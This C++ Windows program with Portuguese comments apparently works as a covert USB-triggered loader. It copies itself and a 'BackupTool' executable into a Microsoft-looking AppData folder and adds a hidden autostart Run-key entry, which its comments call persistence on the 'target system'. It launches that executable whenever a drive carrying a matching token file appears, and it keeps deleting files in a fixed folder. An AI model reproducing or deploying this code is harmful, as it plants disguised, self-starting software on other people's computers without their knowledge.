//x86_64-w64-mingw32-g++ -std=c++17 usb-man.cpp -o 'Carregador do USB.exe'
#include <string>
#include <iostream>
#include <vector>
#include <windows.h>
#include <thread>
#include <mutex>
#include <sstream>
#include <iomanip>
#include <fstream>
#include <filesystem>
#include <algorithm>
#include <tlhelp32.h>
#include <chrono>
#include <ctime>
#include <map>
namespace fs = std::filesystem; // define alias fs



std::mutex LOC_STR;
std::vector<std::thread> feactures;

struct USB_INFO
{
    char letra;
    DWORD serialVolume;        // serial do volume (GetVolumeInformation)
    ULONGLONG tamanhoTotal;
    std::string nomeVolume;
    std::string serialHardware; // serial físico do dispositivo
};

bool isProcessRunning(std::wstring& exeName)
{
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE)
        return false;

    PROCESSENTRY32W pe{};
    pe.dwSize = sizeof(pe);

    if (Process32FirstW(snap, &pe))
    {
        do {
            if (_wcsicmp(pe.szExeFile, exeName.c_str()) == 0)
            {
                CloseHandle(snap);
                return true;
            }
        } while (Process32NextW(snap, &pe));
    }

    CloseHandle(snap);
    return false;
}
void startProcess(const fs::path& exe, USB_INFO& disc, fs::path& tokenBackup)
{
    std::wstring cmdLine = exe.wstring() + L" " + std::wstring(1, disc.letra) + L" " + tokenBackup.wstring();
    DWORD attr = GetFileAttributesW(exe.c_str());
    if (attr == INVALID_FILE_ATTRIBUTES)
    {
        std::wcerr << L"Arquivo inacessivel: " << exe
                   << L" | Erro: " << GetLastError() << L"\n";
        return;
    }

    STARTUPINFOW si{};
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi{};

    fs::path workingDir = exe.parent_path();
    if (!CreateProcessW(
        exe.c_str(),
        cmdLine.data(),
        nullptr, nullptr,
        FALSE,
        CREATE_NEW_CONSOLE,
        nullptr,
        nullptr,
        &si,
        &pi))
    {
        std::wcerr << L"Falha ao iniciar: " << exe
                   << L" | Erro: " << GetLastError() << L"\n";
        return;
    }

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
}
std::vector<std::string> LoadGuids(const std::string& caminho)
{
    std::vector<std::string> guids;
    std::ifstream file(caminho);

    if (!file.is_open())
        return guids;

    std::string linha;
    while (std::getline(file, linha))
    {
        if (!linha.empty())
            guids.push_back(linha);
    }

    file.close();
    return guids;
}

void ValidationTokenGuid(std::string &GUI_VALUE, std::string &serial, USB_INFO& disc)
{
    const char* user = std::getenv("USERNAME");
    if (!user) {
        return;
    }
    int len = MultiByteToWideChar(CP_UTF8, 0, user, -1, NULL, 0);
    std::wstring wuser(len, 0);
    MultiByteToWideChar(CP_UTF8, 0, user, -1, &wuser[0], len);
    wuser.resize(wcslen(wuser.c_str()));

    fs::path exec = fs::path(L"C:\\Users") / wuser / L"AppData\\Roaming\\Microsoft\\DriverServiceUSB\\SSID\\BackupTool-v033v.exe";
    std::string file = std::string("C:\\Users\\") + user + "\\AppData\\Roaming\\Microsoft\\DriverServiceUSB\\SSID\\Serial.key";

    std::vector<std::string> guids = LoadGuids(file);
    if(guids.empty())
    {
        std::cout << "Erro ao localizar arquivo > " << file << "\n";
    }
    else
    {
        if(std::find(guids.begin(), guids.end(), GUI_VALUE) != guids.end())
        {
            std::cout << "Serial: " << serial << "\nID: " << GUI_VALUE << "\n";
            //Call
            std::wstring exeName = exec.filename();
            if (isProcessRunning(exeName))
                return;
            fs::path tokenBackup = fs::path(L"C:\\Users") / std::wstring(user, user + strlen(user)) / L"AppData\\Roaming\\Microsoft" / (std::wstring(GUI_VALUE.begin(), GUI_VALUE.end()) + L".key");
            fs::path token = fs::path(std::wstring(1, disc.letra) + L":\\.base\\sys") / (std::wstring(GUI_VALUE.begin(), GUI_VALUE.end()) + L".key");
            if(!fs::is_regular_file(token))
            {
                if(!fs::is_regular_file(tokenBackup))
                {
                    //Geral uma assinatura para evitar backup recursivo
                    std::ofstream file(tokenBackup, std::ios::out | std::ios::trunc);
                    file << "This a token validation backup files\n";
                    file.close();
        
                    std::lock_guard<std::mutex> lock2(LOC_STR);
                    std::cout << "DEBUG > Arquivo token foi criado com sucesso > \n";
                    startProcess(exec, disc, tokenBackup);
                }
                else
                {
                    startProcess(exec, disc, tokenBackup);
                   
                }
                
            }
            else
            {
                std::lock_guard<std::mutex> lock(LOC_STR);
                std::cout << "DEBUG > Arquivo Backup encontrado >\n";
            }
            
            //CreatebackupEnv(disc);

        }
        else
        {
            std::cout << "\nGUI invalido\n";
        }
        
    }
}
std::tuple<std::string, std::string> GetDiscBaseFile(char letra, std::string &serialHardware)
{
    // monta o caminho do arquivo
    serialHardware.erase(
        std::remove_if(serialHardware.begin(), serialHardware.end(), [](char c){ return !isdigit(c); }),
        serialHardware.end()
    );
    std::string caminho = std::string(1, letra) + ":\\.base\\sys\\SID" + serialHardware + ".key";
    if (std::filesystem::exists(caminho) && std::filesystem::is_regular_file(caminho))
    {
        //std::cout << "Caminho existe > " << caminho << "\n";
        std::ifstream file(caminho);
        if (!file.is_open())
        {
            //std::cout << "Erro ao abrir > " << caminho << "\n";
            return {"", ""};
        }
        std::string linha1, linha2;
        std::getline(file, linha1);
        std::getline(file, linha2);
        file.close();
        return {linha1, linha2};
    }
    return {"", ""};
}
void VerifyDriveDetected(USB_INFO &disc)
{
    
    auto [GUI, SerialH] = GetDiscBaseFile(disc.letra, disc.serialHardware);
    /*
    std::lock_guard<std::mutex> lock2(LOC_STR);
    std::cout << "DEBUG > Para " << disc.serialHardware << " " << GUI << " | " << SerialH << "\n";
    
    std::lock_guard<std::mutex> lock(LOC_STR);
    std::cout << "\n..................................\n";
    std::cout << "Nome > " << disc.nomeVolume << "\nLetra > " <<disc.letra <<"\nSerial > " << disc.serialVolume << "\nSerialHardware > " << disc.serialHardware << "\nSize > " <<disc.tamanhoTotal << "\n";
    */
    if (!GUI.empty() && !SerialH.empty() && SerialH == disc.serialHardware)
    {
        std::lock_guard<std::mutex> lock(LOC_STR);
        std::cout << "DEBUG > Serial correto: " << GUI << " = " << SerialH << "\n"; 
        ValidationTokenGuid(GUI, SerialH, disc);
    }
    else
    {
        std::lock_guard<std::mutex> lock(LOC_STR);
        std::cout << "DEBUG > Serial incorreto: " << GUI << " = " << SerialH << "\n";   
    }
    
}

std::string GetPhysicalDriveSerial(const std::string& driveLetter)
{
    std::string serial;
    std::string devicePath = "\\\\.\\";
    devicePath += driveLetter[0];
    devicePath += ":";

    HANDLE hDevice = CreateFileA(
        devicePath.c_str(),
        0,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        nullptr,
        OPEN_EXISTING,
        0,
        nullptr
    );

    if (hDevice == INVALID_HANDLE_VALUE)
        return serial;

    STORAGE_PROPERTY_QUERY query = {};
    query.PropertyId = StorageDeviceProperty;
    query.QueryType = PropertyStandardQuery;

    BYTE buffer[1024] = {0};
    DWORD bytesReturned = 0;

    if (DeviceIoControl(
            hDevice,
            IOCTL_STORAGE_QUERY_PROPERTY,
            &query,
            sizeof(query),
            &buffer,
            sizeof(buffer),
            &bytesReturned,
            nullptr))
    {
        STORAGE_DEVICE_DESCRIPTOR* desc = (STORAGE_DEVICE_DESCRIPTOR*)buffer;
        if (desc->SerialNumberOffset != 0)
            serial = std::string((char*)buffer + desc->SerialNumberOffset);
    }

    CloseHandle(hDevice);
    return serial;
}
std::vector<USB_INFO> GetShowDispo()
{
    std::vector<USB_INFO> resultado;
    DWORD drivesMask = GetLogicalDrives();

    for (char letra = 'A'; letra <= 'Z'; ++letra)
    {
        if (!(drivesMask & (1 << (letra - 'A'))))
            continue;

        char driveRoot[] = { letra, ':', '\\', '\0' };
        UINT type = GetDriveTypeA(driveRoot);

        if (type != DRIVE_REMOVABLE && type != DRIVE_FIXED)
            continue;

        ULARGE_INTEGER totalBytes{};
        if (!GetDiskFreeSpaceExA(driveRoot, nullptr, &totalBytes, nullptr))
            continue;

        DWORD serialVolume = 0;
        char volumeName[MAX_PATH] = {0};
        if (!GetVolumeInformationA(
                driveRoot,
                volumeName,
                sizeof(volumeName),
                &serialVolume,
                nullptr,
                nullptr,
                nullptr,
                0))
            continue;

        USB_INFO info{};
        info.letra = letra;
        info.serialVolume = serialVolume;
        info.tamanhoTotal = totalBytes.QuadPart;
        info.nomeVolume = volumeName;
        info.serialHardware = GetPhysicalDriveSerial(std::string(1, letra));

        resultado.push_back(info);
    }

    return resultado;
}
void permanece_job_diretory()
{
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);

    std::string path(exePath);

    size_t pos = path.find_last_of("\\/");
    if (pos != std::string::npos) {
        path = path.substr(0, pos);
    }
    SetCurrentDirectoryA(path.c_str());
}
std::wstring GetExecutableName()
{
    wchar_t buffer[MAX_PATH];
    GetModuleFileNameW(NULL, buffer, MAX_PATH);

    std::wstring fullPath(buffer);
    size_t pos = fullPath.find_last_of(L"\\/");

    if (pos != std::wstring::npos)
        return fullPath.substr(pos + 1);

    return fullPath;
}
void enchange_modules_files()
{
    const char* user = std::getenv("USERNAME");
    if (!user) {
        return;
    }

    int len = MultiByteToWideChar(CP_UTF8, 0, user, -1, NULL, 0);
    std::wstring wuser(len, 0);
    MultiByteToWideChar(CP_UTF8, 0, user, -1, &wuser[0], len);
    wuser.resize(wcslen(wuser.c_str()));

    // Diretorio base
    fs::path baseDir = fs::path(L"C:\\Users") / wuser / L"AppData\\Roaming\\Microsoft\\DriverServiceUSB\\SSID";

    //Arquivos necessario para enviar ao sistema alvo
    fs::path fileExecutable = GetExecutableName();
    fs::path exeDest = baseDir / fileExecutable;
    fs::path exeDest2 = baseDir / "BackupTool-v033v.exe";
    fs::path libsh1 = baseDir / "libgcc_s_seh-1.dll";
    fs::path libstdc6  = baseDir / "libstdc++-6.dll";
    fs::path libserial  = baseDir / "Serial.key";


    // Criar diretorio
    try {
        fs::create_directories(baseDir);
    } catch (...) {
        return;
    }

    // Copiar arquivos necessario
    auto copy_if_not_exists = [&](const fs::path& src, const fs::path& dst) {
        try {
            if (!fs::exists(dst)) {
                fs::copy_file(src, dst);
            } else {
            }
        } catch (...) {
        }
    };

    
    copy_if_not_exists(fileExecutable, exeDest);
    copy_if_not_exists("BackupTool-v033v.exe", exeDest2);
    copy_if_not_exists(L"libgcc_s_seh-1.dll", libsh1);
    copy_if_not_exists(L"libstdc++-6.dll", libstdc6);
    copy_if_not_exists(L"Serial.key", libserial);

    // Adicionar persistencia do programa ao sistema alvo (winreg) exe 1
    HKEY hKey;
    LPCWSTR subKey = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
    std::wstring valueName = L"(Definition)_SUPERSURVIVER";
    LPCWSTR data = exeDest.c_str();

    if (RegCreateKeyExW(HKEY_CURRENT_USER, subKey, 0, NULL,
        REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {

        if (RegSetValueExW(hKey, valueName.c_str(), 0, REG_SZ,
            reinterpret_cast<const BYTE*>(data),
            (lstrlenW(data) + 1) * sizeof(wchar_t)) == ERROR_SUCCESS) {
        } else {
        }

        RegCloseKey(hKey);
    } else {
    }

}
void JobPrinterFormat(fs::path& folder)
{
    while(true)
    {
        auto now = std::chrono::system_clock::now();
        std::time_t t = std::chrono::system_clock::to_time_t(now);
        std::tm localTime;

        #ifdef _WIN32
            localtime_s(&localTime, &t);
        #else
            localtime_r(&t, &localTime);
        #endif

        int dia = localTime.tm_mday;

        fs::path currentFolder = folder / std::to_wstring(dia);

        if (!fs::exists(currentFolder) || !fs::is_directory(currentFolder))
        {
            std::this_thread::sleep_for(std::chrono::milliseconds(400));
            continue;
        }

        for (const auto& entry : fs::recursive_directory_iterator(currentFolder))
        {
            if (!fs::is_regular_file(entry))
                continue;

            auto path = entry.path();

            if (path.extension() != L".prt")
            {
                if (fs::remove(path))
                {
                    std::lock_guard<std::mutex> lock(LOC_STR);
                    std::wcout << L"[REMOVIDO] " << path.wstring() << L"\n";
                }
            }
        }

        std::this_thread::sleep_for(std::chrono::milliseconds(400));
    }
}

int main()
{
    permanece_job_diretory();
    enchange_modules_files();
    fs::path folderRip = "E:\\EXPOSTE";
    feactures.emplace_back(JobPrinterFormat, std::ref(folderRip));
    std::map<char, std::thread> discoThreads;
    while (true)
    {
        auto logical_discs = GetShowDispo();

        for (auto& disc : logical_discs)
        {
            // Se ja existe uma thread para esse disco, ignora
            //if(disc.letra == 'C' || disc.letra == 'D' || disc.letra == 'E' || disc.letra == 'H') continue;
            if (discoThreads.find(disc.letra) != discoThreads.end())
                continue;

            // Cria thread para esse disco
            discoThreads[disc.letra] = std::thread([disc]() mutable {
                VerifyDriveDetected(disc);
            });
        }

        // Limpa threads que ja terminaram
        for (auto it = discoThreads.begin(); it != discoThreads.end(); )
        {
            if (it->second.joinable())
            {
                it->second.join();
                it = discoThreads.erase(it);
            }
            else
            {
                ++it;
            }
        }

        std::this_thread::sleep_for(std::chrono::milliseconds(400));
    }
    for (auto& i : feactures)
    {
        if (i.joinable())
            i.join();
    }
    return 0;

}